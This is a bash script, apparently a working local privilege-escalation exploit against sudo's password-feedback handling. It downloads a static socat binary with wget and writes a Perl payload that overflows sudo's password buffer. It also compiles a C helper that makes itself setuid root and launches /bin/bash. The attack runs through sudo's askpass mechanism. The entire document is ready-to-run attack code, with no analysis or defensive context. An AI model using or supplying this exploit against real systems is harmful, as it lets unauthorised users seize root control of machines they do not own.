#!/bin/bash
# We will need socat to run this.
if [ ! -f socat ];
then
    wget https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat
    chmod +x socat
fi

cat <<EOF > xpl.pl
\$buf_sz = 256;
\$askpass_sz = 32;
\$signo_sz = 4*65;
\$tgetpass_flag = "\x04\x00\x00\x00" . ("\x00"x24);
print("\x00\x15"x(\$buf_sz+\$askpass_sz) .
     ("\x00\x15"x\$signo_sz) .
     (\$tgetpass_flag) . "\x37\x98\x01\x00\x35\x98\x01\x00\x35\x98\x01\x00\xff\xff\xff\xff\x35\x98\x01\x00\x00\x00\x00\x00".
     "\x00\x00\x00\x00\x00\x15"x104 . "\n");
EOF

cat <<EOF > exec.c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
        printf("Exploiting!\n");
        int fd = open("/proc/self/exe", O_RDONLY);
        struct stat st;
        fstat(fd, &st);
        if (st.st_uid != 0)
        {
                fchown(fd, 0, st.st_gid);
                fchmod(fd, S_ISUID|S_IRUSR|S_IWUSR|S_IXUSR|S_IXGRP);
        }
        else
        {
                setuid(0);
                execve("/bin/bash",NULL,NULL);
        }
return 0;
}
EOF
cc -w exec.c -o /tmp/pipe
./socat pty,link=/tmp/pty,waitslave exec:"perl xpl.pl"&
sleep 0.5
export SUDO_ASKPASS=/tmp/pipe
sudo -k -S id < /tmp/pty
/tmp/pipe

